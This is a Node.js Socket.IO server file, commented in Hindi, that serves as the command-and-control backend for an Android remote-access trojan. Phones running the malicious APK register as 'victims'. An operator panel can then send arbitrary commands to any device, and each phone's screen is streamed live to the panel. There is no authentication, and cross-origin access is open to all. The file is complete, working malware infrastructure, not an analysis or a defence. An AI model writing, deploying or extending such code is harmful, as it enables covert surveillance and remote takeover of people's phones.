const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// प्रदर्शन के लिए अनुकूलित Socket.IO सर्वर
const io = new Server(server, {
    // WebSocket को प्राथमिकता दें, जो सबसे तेज़ है
    transports: ['websocket', 'polling'], 
    cors: {
        origin: "*",
    }
});

const PORT = process.env.PORT || 8080;

// --- डेटा स्टोरेज ---
// यह ऑब्जेक्ट सभी कनेक्टेड डिवाइस की वर्तमान स्थिति को संग्रहीत करता है
let devices = {};

// --- वेब रूट्स ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

app.get('/devices', (req, res) => {
    res.json({
        connected_devices_count: Object.keys(devices).length,
        devices: Object.values(devices).map(d => ({ deviceId: d.deviceId, deviceName: d.deviceName, battery: d.battery }))
    });
});

// --- मुख्य Socket.IO लॉजिक ---
io.on('connection', (socket) => {

    // ==================================================
    // 1. पैनल (एडमिन) से आने वाले इवेंट्स
    // ==================================================
    socket.on('admin_join', () => {
        // एडमिन को पहले से कनेक्टेड सभी डिवाइस की सूची भेजें
        socket.emit('device_list', Object.values(devices));
    });

    socket.on('command_to_device', (data) => {
        const { deviceId, action, payload } = data;
        const targetDevice = devices[deviceId];
        if (targetDevice && targetDevice.socketId) {
            // कमांड को सीधे लक्षित APK को भेजें
            io.to(targetDevice.socketId).emit(action, payload);
        }
    });

    // ==================================================
    // 2. डिवाइस (APK) से आने वाले इवेंट्स
    // ==================================================
    socket.on('victim_connect', (deviceInfo) => {
        devices[deviceInfo.deviceId] = { ...deviceInfo, socketId: socket.id };
        // सभी जुड़े हुए एडमिन पैनल को सूचित करें
        io.emit('new_device_joined', devices[deviceInfo.deviceId]);
    });

    socket.on('screen_data', (data) => {
        // स्क्रीन डेटा को सीधे सभी जुड़े हुए एडमिन पैनल पर ब्रॉडकास्ट करें
        // यह सबसे तेज़ तरीका है
        io.emit('screen_update', data);
    });

    // ==================================================
    // 3. डिस्कनेक्शन हैंडलिंग
    // ==================================================
    socket.on('disconnect', () => {
        let disconnectedDeviceId = null;
        for (const deviceId in devices) {
            if (devices[deviceId].socketId === socket.id) {
                disconnectedDeviceId = deviceId;
                break;
            }
        }
        if (disconnectedDeviceId) {
            delete devices[disconnectedDeviceId];
            // सभी एडमिन को सूचित करें कि डिवाइस डिस्कनेक्ट हो गया है
            io.emit('device_disconnected', disconnectedDeviceId);
        }
    });
});

// --- सर्वर को शुरू करना ---
server.listen(PORT, () => {
    console.log(`🚀 सर्वर पोर्ट ${PORT} पर अधिकतम गति के लिए तैयार है!`);
});
